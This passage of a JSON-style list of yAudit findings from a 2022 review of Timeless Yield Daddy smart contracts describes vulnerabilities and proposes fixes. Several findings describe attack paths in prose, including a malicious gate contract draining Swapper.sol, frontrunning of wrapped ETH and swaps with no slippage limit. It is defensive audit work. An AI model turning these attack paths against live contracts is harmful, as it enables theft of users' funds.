totalBorrows - totalReserves).divWadDown(totalSupply); Return value calculation from local LibCompound.sol contract: totalCash + totalBorrows - totalReserves.divWadDown(totalSupply); Example values loosely taken from cDAI: totalCash = 400000000000000000000000000 totalBorrows = 300000000000000000000000000 totalReserves = 20000000000000000000000000 totalSupply = 3100000000000000000 Return value result from transmissions11/libcompound: 219354838709677419354838709 Return value result from local LibCompound.sol: 693548387096774193548387097", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. User can set arbitrary approveMaxIfNeeded() target", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "This finding is not a complete attack chain, but the missing link of the chain depends on a hypothetical weakness in an external contract, which is out of scope of this review. In order for value to be stolen from Swapper.sol, a malicious actor would: Create a malicious contract that is approved by Swapper.sol for ERC20 tokens that pass through Swapper.sol, which enables it to transferFrom() those tokens Use an external call from Swapper.sol to call the malicious contract while Swapper.sol holds value to take that value before it can be sent to the user calling the contract The first step is possible because the input argument to approveMaxIfNeeded() in Swapper.sol code is a user-specified argument. Not only that, but in a function such as _swapXpytToUnderlying(), the args.gate parameter approved for args.xPYT here is only used for one function call, exitToUnderlying(). This function could be implemented in a malicious contract as an empty function and the rest of the _swapXpytToUnderlying() function would still succeed, allowing the args.gate user-specific argument to be set to an address under the malicious user's control. Even worse, this exitToUnderlying() could be where the transferFrom() call happens, so if an innocent user specifies this value for the args.gate value (either due to a mistake, a Timeless frontend hack, or any other means), the value would be transferred to the malicious gate contract and the innocent user would lose the value that was going to be sent to them. It is not even necessary for the user to provide a malicious value for args.gate for this to become a problem. Multiple external calls exist within the functions of Swapper.sol, and if any of these are insecure or have an external call to an insecure contract, loss of value can occur even if the user's transaction has the proper function argument values set.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "3. Lack of slippage protection in Curve swaps", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The exchange() call in _swap() in CurveV2xPYT.sol sets a minimum output token quantity of zero. This means the swap will happen regardless of how imbalanced the pool is. The only check that is applied to the quantity of tokens received is validating the amount is greater than minXpytAmountOut. The value of minXpytAmountOut does not help with slippage and is not user customizable, it only helps avoid a case where a very small (near zero) amount of of xPYT is returned. This is in contrast to where pool.exchange() is used in _swapFromUnderlying() in the swapper repository. There is a check of tokenAmountOut < args.minAmountOut in Swapper.sol to check the return value of pool.exchange(). Whether the args.minAmountOut value will be calculated properly in the user interface is outside the scope of this review, but at least users have the option to specify a slippage tolerance. Similarly, the output of the swapAmountOut return value from _swapFromYieldToken() is compared against args.minAmountOut in Swapper.sol.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "4. Accrued rewards may not be returned to depositors", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The claimRewards() function is an external function without access controls, so anyone can call it. When it is called, the liquidity mining incentive rewards accrued to the aTokens held by the ERC4626 vault are sent to the address rewardRecipient. The rewardRecipient address may be a previously audited contract that is out of scope of this review, but because it is not in the scope of this review, it is not clear whether users will receive rewards claimed from this function.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "5. Bypass to add cEtherAddress to underlyingToCToken array", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The CompoundERC4626Factory.sol constructor has an if statement that prevents cEtherAddress from getting added to the underlyingToCToken array. The updateUnderlyingToCToken() function has a for loop very similar to the constructor, but the if statement check is missing. Because updateUnderlyingToCToken() has no access controls, anyone can use updateUnderlyingToCToken() to add the cEtherAddress to the array. This will cause problems because the CompoundERC4626.sol code assumes ERC20 tokens when using imported SafeTransferLib functions and does not use safeTransferETH() for the case where ETH is the underlying asset.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "6. Improper wrapEthInput() call can cause value loss", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "If a user calls wrapEthInput() as a separate transaction, ether will be converted to WETH and deposited to the Swapper.sol address. Even if the user intends to call swapUnderlyingToXpyt() or swapUnderlyingToNyt() in their next transaction, the user can be frontrun. Whoever calls swapUnderlyingToXpyt() or swapUnderlyingToNyt() while Swapper.sol holds value can extract that value because those functions use args.underlying.balanceOf(address(this)) for the value of tokenAmountIn (here and here).", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "7. ERC20 tokens sitting in contracts can be extracted", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The Swapper.sol contract uses the code args.TOKEN.balanceOf(address(this)) in several places. The value of args.xPYT, args.pyt, or args.nyt can be any address, which means any token balance stored by the contract can be queried, and soon after extracted, with this code. The contract is not designed to store value, but if it does store value (say if a user accidentally sends tokens directly to the contract), the value could be extracted in a backrun transaction. A similar scenario exists with Uniswap's V2 router, which is not designed to store any token balances but it does have non-zero token balances as seen on etherscan. Separately, sweep() in xPYT.sol is described with Uses the extra asset balance of the xPYT contract to mint shares. This can remove any extra assets of token asset that sits in the xPYT.sol contract. While less generalize than the Sweeper.sol contract, a more specific case of the same issue exists.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "8. Difficult to use withdraw() with full deposit", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Aave allows users to submit the value type(uint256).max to withdraw the user's full balance. No similar feature is present in the Yield Daddy ERC4626 vault. This makes it hard to use withdraw() while specifying the correct value of assets to remove all aTokens from the vault because the aTokens are rebasing and increasing over time. In contrast, the redeem() function allows a user a specify the number of shares they want to withdraw. Shares are not always rebasing and are easier for a user to specify an accurate number for a complete withdrawal.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "9. Inaccurate function return values", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The maxDeposit() and maxMint() functions only return the value type(uint256).max when the underlying pool can accept a deposit or mint. The value type(uint256).max does not accurately represent the maximum value that can be deposited into the vault when some ERC4626 tokens have already been minted. This is because the vault normally can mint a maximum of type(uint256).max, otherwise the totalSupply state variable will overflow and cause a revert, so the existing token supply should be subtracted. The same is true for aTokens, which should have the existing supply excluded. EIP4626 defines this requirement for maxMint(): MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). The output of maxDeposit() cannot be passed into withdraw() without a revert, which does not satisfy this ERC4626 requirement. A more accurate return value for maxDeposit() in Aave V2 and Aave V3 is: return type(uint256).max - aToken.totalSupply(); The totalSupply value limitation of the ERC4626 vault can be ignored because the totalSupply of the vault will always be less than or equal to aToken.totalSupply(), so the aToken totalSupply is the limiting factor. The same issue is relevant for maxMint(), but the return value of maxMint() should be in units of shares instead of assets because the ERC4626 mint() function takes a shares value as input. The more accurate return value for maxMint() in Aave V2 and Aave V3 is therefore: return convertToShares(type(uint256).max - aToken.totalSupply()); This issue is present in the Compound ERC4626 wrapper as well. A similar solution should be applied.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "10. No fee-on-transfer token support", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Fee-on-transfer tokens have the property where the value that is sent is not the same as the value that is received. This difference in logic compared to standard ERC20 tokens requires special handling in solidity to avoid a revert or loss of value. No fee-on-transfer ERC20 appears to exist on the supported lending platforms at the time of the review, but if one is added in the future or if the fee is enabled on an existing token that supports fee-on-transfer, the ERC4626 wrappers for protocols that require two separate transfers for depositing and withdrawing (Euler, Compound, Aave only for depositing) would not function with fee-on-transfer tokens because the deposit or withdraw process would revert because the fee is not accounted for in between the two transfers. The swapper repo also lacks fee-on-transfer support. This is because the tokenAmountIn value used in the safeTransferFrom() call is assumed to equal the value held by the Swapper.sol contract after the transfer takes place. This will revert when args.gate.enterWithUnderlying() is called because the underlying.safeTransferFrom() call in Gate.sol's enterWithUnderlying() will not have sufficient balance to transfer.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "11. Curve's price_oracle() may provide less effective sandwiching protection post-merge", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "In the upcoming Merge of the Ethereum mainnet, block proposers and validators are assigned randomly 2 epochs in advance. This enables an attacker with a sufficient amount of capital to fully manipulate the contents of two or more blocks in a row, undermining previous the security assumption that arbitrageurs could disrupt a multi-block oracle manipulation attack. This risk is compounded by price oracles that put more weight on recent observations, such as Curve's EMA oracle.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "12. Insufficient SwapArgs input validation", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "There is no validation in _swapUnderlyingToNyt() that confirms that the addresses of args.underlying, args.nyt, args.pyt, args.xPYT, and args.vault are all related to the same underlying asset. Similarly, the value args.gate may not hold the address of the actual Gate.sol contract in the timeless protocol, but instead may be the address of an attacker's contract. An external call is made to args.gate in _swapUnderlyingToNyt() and _swapUnderlyingToXpyt(), and although the external functions swapUnderlyingToNyt() and swapUnderlyingToXpyt() have the nonReentrant modifier, there is no global reentrancy lock across the Timeless protocol(s), so the risk of a hack involving reentrancy is not zero.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "13. Curve Swap design may generate unexpected NYT/PYT dust", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "According to the documentation, CurveV2Swapper's swapNytToUnderlying() and swapXpytToUnderlying() functions are intended to be used in conjunction with CurveV2Juggler.juggleXpytInput() and CurveV2Juggler.juggleNytInput() respectively. These two juggle function are intended to operate as off-chain oracles which are used to calculate the correct quantities of NYT/PYT tokens to be swapped. The goal of the swap is for the user to end up with a nominally equivalent number of NYT+PYT tokens for a vault, which are then redeemed in equal amounts for xPYT tokens, which is then redeemed for the underlying vault's token. The decoupling of the off-chain price oracle with the on-chain swap introduces a chance that the swap is executed at a different price that the price oracle expected. If a swap is executed at a different price than the oracle predicted, then the user will have differing quantities of NYT and PYT, and will have some amount of dust remaining after they redeem their NYT+PYT for xPYT.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "14. xPYT deployment lacks trust mechanism", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Often the CREATE2 opcode is used to deploy contracts that depend on underlying parameters, because the address of the contract can be derived from those underlying parameters. This is the approach used in deployYieldTokenPair() of Factory.sol to deploy new NYT/PYT pairs and by Uniswap V2 to deploy new pairs. But because multiple xPYT tokens can exist for a single underlying vault, perhaps CREATE2 cannot be used in this case. There is no state variable in CurveV2xPYTFactory.sol that stores the address of deployed xPYT contracts, which means that functions that accept a xPYT address as a function argument, including several functions in Swapper.sol that have a SwapArgs.xPYT function argument, cannot determine whether the xPYT address is a legitimate xPYT token or a malicious contract. This is unlikely to impact most users who use a web interface in their browser, but it may open up an attack vector of a malicious contract posing as a legitimate xPYT token.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "15. Missing PYT/NYT lookup mechanism", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The PerpetualYieldToken.sol and NegativeYieldToken.sol contracts contain many external calls to the gate contract, notably the gate.beforePerpetualYieldTokenTransfer() call in PYT's transfer() and transferFrom() functions and the gate-protected gateMint() and gateBurn() in BaseERC20.sol. If the gate is malicious, it could leverage these callbacks for a variety of attack vectors.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "16. Replace require blocks with errors", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Instances of require that can be replace with custom errors are found in: AaveV2 AaveV3 xPYT", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "17. Declare variables internal, immutable, or constant when possible", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Many public immutable variables exist in the Euler, Aave V2, Aave V3, and Compound wrappers. If possible, make these internal instead of public for gas savings. There is one variable in xPYT.sol, assetBalance, that can be made private because it already has a public getter function in the form of totalAssets(). A variable in CurveV2xPYT.sol, curvePool, can be made immutable because it is only changed once, in the initializer.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "18. Remove beforeWithdraw() calls", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "withdraw() and redeem() call beforeWithdraw(), but beforeWithdraw() is never implemented with code. beforeWithdraw() is declared in ERC4626.sol as an empty virtual function. The calls to beforeWithdraw() can be removed because it doesn't run any code.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "19. Replace duplicate code with internal function", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The code below is found in two places in AaveV2ERC4626.sol (here and here): // check if pool is paused if (lendingPool.paused()) { return 0; } // check if asset is paused uint256 configData = lendingPool.getReserveData(address(asset)).configuration.data; if (!_getActive(configData)) { return 0; } This code could be moved into an internal view function to reduce contract deployment costs. The same could be done with the similar duplicate code block (here and here). The Aave V3 wrapper has duplicate code in the same functions of maxDeposit(), maxMint(), maxWithdraw(), and maxRedeem().", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "20. Declare functions external for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "There is a public function updateUnderlyingToCToken() in CompoundERC4626Factory.sol that can be made external.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "21. Use claimComp() with borrowers = false", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "claimComp() is called in claimRewards(). It can be replaced with a call to the other claimComp() function with borrowers set to false.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "22. Use unchecked if no underflow risk", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "There are two subtraction operations (here and here) that should not underflow because the supplyCap should be greater than the value of totalSupply(). The Aave V3 code should be checked to confirm that there is a valid comparison to supplyCap when the supply increases. Another subtraction operation can be made unchecked in CurveV2Juggler.sol (and the out of scope UniswapV3Juggler.sol contract), found here and here. This operation can be unchecked because tokenAmountIn >= (tokenAmountIn >> 1), and because swapAmountIn = (tokenAmountIn >> 1), then tokenAmountIn >= swapAmountIn and tokenAmountIn - swapAmountIn >= 0. Swapper.sol has two operations repeated four times that can be unchecked to save gas. A similar operation that already is unchecked is found in xPYT.sol. Division here, here, here, and here can be unchecked because (protocolFeeInfo_.fee / 10000) < 1 so it cannot overflow. uint256 feeAmount = (tokenAmountIn * protocolFeeInfo_.fee) / 10000; Subtraction here, here, here, and here can be unchecked because feeAmount < tokenAmountIn so it cannot underflow. tokenAmountIn -= feeAmount;", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "23. Function arg should be calldata not memory", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The Compound factory contract has a memory argument that can be changed to calldata for gas savings. The same change can be made for _deployCurvePool() in CurveV2xPYTFactory.sol.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "24. Move revert earlier in function", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "This revert check in the xPYT constructor can take place earlier in the constructor because it only relies on a function argument and does not rely on any other calculations. Move this if statement to immediately follow the other if statement revert check.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "25. Internal function is cheaper than modifier", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "This onlyOwner modifier could be replaced with a require check in this function or an internal function. For example, add this line to ownerSetProtocolFee() to replace the modifier on the function. require(msg.sender == owner, \"UNAUTHORIZED\");", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "26. Zero check could save gas", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "getClaimableYieldAmount() is called once in xPYT.sol, but this function is missing a zero check for yieldAmount. The first function that calculates the claimable yield, claimYieldAndEnter(), confirms that yieldAmount != 0. The other locations where the claimable yield is calculated, getClaimableYieldAmount, does not confirm that yieldAmount != 0. This zero check could provide a gas savings in the case that yieldAmount is zero.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "27. Remove unnecessary approve", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "This approve() call is designed to initialize the storage slot to a non-zero value in order to save gas on future changes of this slot. The problem is that the approve() call that happens before each swap overwrites the initial allowance value, which is subsequently consumed by the Curve swap and re-set to zero.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "28. Unnecessary logic in approveMaxIfNeeded() function", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The contracts that call approveMaxIfNeeded() include Swapper.sol and CurveV2Swapper.sol. No other approve() or safeApprove() calls happen in these contracts, so the only allowance being set is an allowance of type(uint256).max. If the allowance is set to type(int256).max, USDT will not decrease the allowance when a transfer happens. So the process of checking the allowance and setting it to zero if the value is not type(int256).max is unnecessary and can be replaced with a simple token.safeApprove(spender, type(uint256).max); call. There might be an edge case other than USDT that the approveMaxIfNeeded() was designed for, but the function should not be necessary for USDT or standard ERC20 tokens.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "29. Direct transfer of aTokens impacts share value", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "function totalAssets() public view virtual override returns (uint256) { // aTokens use rebasing to accrue interest, so the total assets is just the aToken balance return aToken.balanceOf(address(this)); } The totalAssets() function in AaveV2ERC4626.sol and AaveV3ERC4626.sol is an important function. It is called in the calculations of convertToShares(), convertToAssets(), previewMint(), and previewWithdraw(). It is possible for anyone to transfer Aave aTokens directly to the vault, which would change the value returned by totalAssets(). Although such an increase in value happens normally as deposits take place or yield is earned, an instantaneous change may impact how other protocols interface with Yield Daddy ERC4626 tokens depending on how the other protocols are implemented. This comment is absent from the Compound ERC4626 wrapper, but the same edge case of a user sending tokens directly to the vault can apply.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "30. aAMPL edge cases", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "AMPL is a rebasing token, but unlike Aave aTokens, AMPL can increase or decrease the balance that user's hold. This website shows some recent rebasing activity in both the positive and negative directions. The ability to rebalance in either direction means that a user depositing into the Yield Daddy aAMPL vault may receive less tokens when withdrawing than when they deposited. If there are very few depositors in the aAMPL vault, a user with a large fraction of vault ownership may be able to take advantage of the timing of the AMPL rebasing (which happens once per day) at the cost of the other vault shareholders.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "31. Invert constant mask variables", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Modify the constant masks in the Aave V3 wrapper to the following: - uint256 internal constant DECIMALS_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFF; + uint256 internal constant DECIMALS_MASK = 0xFF << 48; - uint256 internal constant ACTIVE_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFF; + uint256 internal constant ACTIVE_MASK = 1 << 56; - uint256 internal constant FROZEN_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFFFFFFFF; + uint256 internal constant FROZEN_MASK = 1 << 57; - uint256 internal constant PAUSED_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFF; + uint256 internal constant PAUSED_MASK = 1 << 60; - uint256 internal constant SUPPLY_CAP_MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFF000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFF; + uint256 internal constant PAUSED_MASK = 0xFFFFFFFFF << 116; Remember to remove the negation where the variables are used, so ~DECIMALS_MASK will become DECIMALS_MASK.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "32. Simplify logic in maxDeposit() and maxMint()", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "maxDeposit() and maxMint() have logic which can be simplified: - if (!(_getActive(configData) && !_getFrozen(configData) && !_getPaused(configData))) { + if (!_getActive(configData) || _getFrozen(configData) || _getPaused(configData)) {", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "33. Add parentheses to avoid order of operations ambiguity", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "These three functions have boolean logic that relies on order of operations. If this changes in a future solidity version, an incorrect value may be calculated. Applying parentheses would remove any ambiguity and make it easier to upgrade to future solidity releases with reduced concerns. function _getActive(uint256 configData) internal pure returns (bool) { - return configData & ~ACTIVE_MASK != 0; + return (configData & ~ACTIVE_MASK) != 0; } function _getFrozen(uint256 configData) internal pure returns (bool) { - return configData & ~FROZEN_MASK != 0; + return (configData & ~FROZEN_MASK) != 0; } function _getPaused(uint256 configData) internal pure returns (bool) { - return configData & ~PAUSED_MASK != 0; + return (configData & ~PAUSED_MASK) != 0; }", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "34. Inconsistent ERC4626 callback usage", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The default withdraw() and redeem() function implementations are overridden in AaveV2ERC4626.sol, possibly to save gas from one ERC20 token transfer. The same approach could be used for deposit() and mint() by having the user send their reserve asset directly to Aave with an onBehalfOf value in the deposit() call of the Yield Daddy vault. This may require the user to approval the Aave pool, but it would improve consistency in the Yield Daddy code.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "35. Some hard coded variables might be better adjustable", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The rewardRecipient is an address that receives accrued rewards from the ERC4626 vault. This address cannot be changed in the existing AaveV2ERC4626.sol contract. Scenarios may arise where this value needs to be changed, but the contract does not currently allow this to happen.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "36. Unclear upgrade mechanism", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The Yield Daddy contracts have no clear upgrade mechanism even though some hard coded values might need changing in the future. Some examples of upgrade use cases include: If extra features are planned for a future Yield Daddy vault version, there is no clear path for migrating the aTokens from the existing vault. The Yield Daddy vaults do not have a mechanism to borrow from Aave using the aTokens the vault holds. Borrowing with some amount of this collateral could allow Yield Daddy to increase the yield generated and improve the value proposition to users. Introducing such a mechanism in the future would require the vault to approve the aTokens to another address or borrowing directly from Aave, and neither option is available with the contract logic. Aave had a referral program in the past which is now inactive, and a governance proposal could theoretically bring the program back. Even though this scenario is unlikely, if it were to happen the Aave deposit() call in Yield Daddy has a hard coded value of 0 for the referral code, so no referral rewards could be collected if the reward program is resumed by Aave.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. General lack of documentation and comments", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "To give one example of some unclear code that should have comments, the maxRedeem() function checks how much of the reserve asset is held by the aToken address. It may not be obvious to all readers that the reason that an external protocol is queried before returning a result for Yield Daddy users is to cover the edge case where the Aave pool is undercollateralized (which is common due to Aave's lending feature) and the Yield Daddy withdrawal would be larger than the entire Aave aToken reserve balance. A comment in the code or developer docs explaining this reasoning could expedite understanding for developers interfacing with this protocol or future code reviewers. Another place where NetSpec comments would help is clarifying that the return value of maxWithdraw() is in units of shares while the return value of maxRedeem() is in units of the underlying asset.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Typos", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The Aave V2 factory contract has a comment accidentally copied from Aave V3. This should be modified to reference Aave V2. This comment about burn the xPYT should be removed or changed. It was erroneously copied from a similar function that does burn xPYT. The same applieds to this other comment in the same function.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "39. Aave LendingPool getConfiguration() can replace getReserveData()", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "getReserveData() returns many pieces of data in Aave V2 and Aave V3. The only data needed in the wrapper contracts can be received from getConfiguration(), which returns less data in Aave V2 and Aave V3. This efficiency boost won't save gas because it is used in a view function.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "40. Redundant dependency imports", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The ERC4626 factory contracts have the same redundant import of two solmate files. For example, Aave V3 imports ERC4626Factory.sol and two solmate files. But the imported base factory contract has the solmate files imported, making the import of these files redundant. StETHERC4626.sol has a similar instance of this where StETHERC4626.sol imports \"solmate/tokens/ERC20.sol\" and \"./external/IStETH.sol\", but \"solmate/tokens/ERC20.sol\" is already imported by IStETH.sol making the separate import unnecessary. CurveV2Swapper.sol has a similar instance of this where CurveV2Swapper.sol imports \"../Swapper.sol\" and \"../lib/ApproveMaxIfNeeded.sol\", but \"../lib/ApproveMaxIfNeeded.sol\" is already imported by Swapper.sol. The same applies to the solmate and timeless imports in CurveV2Swapper.sol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "41. Interface doesn't match mainnet contract", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "This is the Compound code defining the mintGuardianPaused mapping as mapping(address => bool) public mintGuardianPaused. The interface for this mapping is defined as function mintGuardianPaused(ICERC20 cToken) external view returns (bool). This is problematic because the address type is not equal to the ICERC20 type. A foundry test was created to test if this type mismatch caused a revert, but the test passed without a revert. However, the custom maxMint() and maxDeposit() functions are not tested with existing tests for Compound or Aave V3.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "42. Consider upgrade to latest solidity release", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The release notes of solidity releases since 0.8.13 describe code generation bugfixes and gas optimizations that have been introduced in the more recent releases. It would be best to use the latest release unless there is a good reason to continue using 0.8.13.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "43. Theoretical overflow of convertToShares() and convertToAssets()", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Below is the custom convertToShares() function from StETHERC4626.sol: function convertToShares(uint256 assets) public view virtual override returns (uint256) { uint256 supply = stETH().totalSupply(); return supply == 0 ? assets : assets.mulDivDown(stETH().getTotalShares(), supply); } If the value of the assets input parameter or the value of stETH().getTotalShares() is very close to type(uint256).max at the same time that supply is a very small value, this function could revert during the mulDivDown library call. The same is true of the convertToShares() function in the standard solmate implementation. The convertToAssets() function suffers from the same side effect in this extreme case.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "44. No zero address checks in constructor", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "The xPYT.sol constructor sets three state variables to specific external contract addresses. No zero address check is performed, making it possible that one of these state variables could be set to the zero address.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "45. Modify Gate.sol claimYieldAndEnter() function argument", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Most locations where xPYT is used, it is cast to an address with address(xPYT). Only once is it used as IxPYT type. Instead, take in a function argument of type address and cast to IxPYT the one time that this type is needed.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "46. CurveV2xPYT utilizes a non-TWAP price oracle", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "Curve's price_oracle() implementation uses an exponential moving average for its oracle. EMA oracles have different properties from TWAP oracles, most notable of which is they are more sensitive to high price volatility near the time of query.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "47. Replace magic numbers with constants", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "There are many instances of the value 10000. Consider replacing this magic number with a constant internal variable named FEE_BASE. Instances are found here, here, here, and here.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "48. No timelock or other protection around changing fee or fee recipient", "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Timeless-Yield-Daddy.md", "body": "ownerSetProtocolFee() allows the owner to set the fee percentage and fee recipient. While this function has access control to only allow the owner to call this function, there is no further controls to reduce centralization risk. Whether this is necessary depends on the parties who are intended to receive the fees. If users are intended to receive a fraction of the fees from Swapper.sol, they may want additional guarantees that the fees will not be redirected somewhere else without notice.", "labels": ["yAudit", "Severity: 